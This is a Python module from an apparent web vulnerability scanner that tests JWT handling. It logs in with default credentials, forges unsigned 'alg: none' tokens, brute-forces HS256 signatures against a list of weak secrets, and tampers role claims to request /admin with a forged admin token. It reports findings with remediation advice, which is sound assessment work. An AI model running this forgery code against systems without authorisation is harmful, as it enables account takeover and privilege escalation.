import base64
import hashlib
import hmac
import json
import re
from modules.base import BaseModule


class JwtModule(BaseModule):
    NAME = "jwt"
    DESCRIPTION = "JWT testing - alg:none, HS256 brute-force, claim tampering"

    WEAK_SECRETS = [
        "secret", "password", "jwt", "key", "123456", "admin",
        "changeme", "default", "supersecret", "mys3cr3t", "p@ssw0rd",
        "token", "auth", "private", "qwerty", "letmein",
    ]

    def run(self):
        self.log.info("[jwt] Testing JWT security")
        token = self._find_jwt()
        if not token:
            self.log.debug("[jwt] No JWT found in initial response")
            return
        parts = token.split(".")
        if len(parts) != 3:
            return
        header  = self._decode_part(parts[0])
        payload = self._decode_part(parts[1])
        self.log.debug(f"[jwt] header={header} payload={payload}")
        self._test_none_alg(parts, payload)
        self._test_weak_secret(parts, payload)

    def _find_jwt(self) -> str:
        resp = self.post(self.url("/login"), data={"username": "user", "password": "password"})
        if not resp or self.is_probable_not_found(resp):
            return ""
        for cookie in self.session.cookies:
            if re.search(r"jwt|token|auth", cookie.name, re.I):
                return cookie.value
        m = re.search(r'["\']?token["\']?\s*:\s*["\']([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)["\']',
                      resp.text)
        if m:
            return m.group(1)
        auth = resp.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:]
        return ""

    @staticmethod
    def _decode_part(part: str) -> dict:
        pad = part + "=" * (4 - len(part) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(pad))
        except Exception:
            return {}

    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).decode().rstrip("=")

    def _forge_token(self, header: dict, payload: dict, secret: str = None) -> str:
        h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url(json.dumps(payload, separators=(",", ":")).encode())
        if secret is None:
            return f"{h}.{p}."
        sig = hmac.new(
            secret.encode(), f"{h}.{p}".encode(), hashlib.sha256
        ).digest()
        return f"{h}.{p}.{self._b64url(sig)}"

    def _test_with_token(self, token: str) -> bool:
        resp = self.get(
            self.url("/admin"),
            headers={"Authorization": f"Bearer {token}"},
        )
        return bool(resp and resp.status_code == 200 and
                    not self.is_probable_not_found(resp) and
                    any(kw in resp.text.lower() for kw in ["admin", "dashboard"]))

    def _test_none_alg(self, parts, payload):
        new_header = {"alg": "none", "typ": "JWT"}
        tampered = dict(payload)
        for role_key in ("role", "admin", "is_admin", "group"):
            if role_key in tampered:
                tampered[role_key] = "admin" if role_key != "is_admin" else True
        token = self._forge_token(new_header, tampered)
        if self._test_with_token(token):
            self.add_finding(
                severity="CRITICAL",
                title="JWT algorithm confusion: 'none' accepted",
                url=self.url("/admin"),
                detail="Server accepted unsigned JWT (alg=none).",
                payload=token[:80] + "...",
                remediation=(
                    "Explicitly reject 'none' algorithm. "
                    "Pin the expected algorithm on the server side."
                ),
            )

    def _test_weak_secret(self, parts, payload):
        msg = f"{parts[0]}.{parts[1]}".encode()
        orig_sig = parts[2]
        for secret in self.WEAK_SECRETS:
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            if self._b64url(sig) == orig_sig:
                tampered = dict(payload)
                for role_key in ("role", "admin", "is_admin"):
                    if role_key in tampered:
                        tampered[role_key] = "admin" if role_key != "is_admin" else True
                token = self._forge_token(
                    {"alg": "HS256", "typ": "JWT"}, tampered, secret
                )
                self.add_finding(
                    severity="CRITICAL",
                    title=f"JWT signed with weak secret: '{secret}'",
                    url=self.url("/admin"),
                    detail="Secret was guessable; forged admin token created.",
                    payload=token[:80] + "...",
                    remediation=(
                        "Use a cryptographically random secret ≥ 256 bits. "
                        "Consider RS256/ES256 (asymmetric) instead of HS256."
                    ),
                )
                return
